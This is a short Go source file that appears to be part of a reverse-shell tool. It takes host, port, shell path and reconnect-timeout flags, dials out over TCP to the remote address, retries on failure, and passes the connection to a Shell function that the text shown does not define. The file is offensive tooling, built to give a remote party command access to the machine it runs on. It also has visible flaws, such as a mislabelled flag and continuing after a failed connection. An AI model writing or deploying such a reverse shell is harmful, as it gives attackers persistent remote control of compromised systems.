package main

import (
	"net"
	"time"
    "flag"	
	"log"
)

type Config struct {
	Address 	string
	Shell		string
	OS			string
	Timeout 	time.Duration
}

func main() {
	var config Config
	var host, port, timeout string

    flag.StringVar(&host, "host", "127.0.0.1", "Host")
	flag.StringVar(&port, "port", "1234", "Port")
	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Port")
	flag.StringVar(&timeout, "timeout", "15s", "Reconnecting Time")
    flag.Parse()

	config.Address = host + ":" + port
	config.Timeout, _ = time.ParseDuration(timeout)

	ReverseShell(config)
}

func ReverseShell(config Config) {
	conn, err := net.Dial("tcp", config.Address)
	if err != nil {
		if conn != nil {
			conn.Close()
		}

		// reconnect
		time.Sleep(config.Timeout)
		ReverseShell(config)
	}

	Shell(conn, config)    
}

func BindShell(config Config) {
	log.Println(config.Address)
}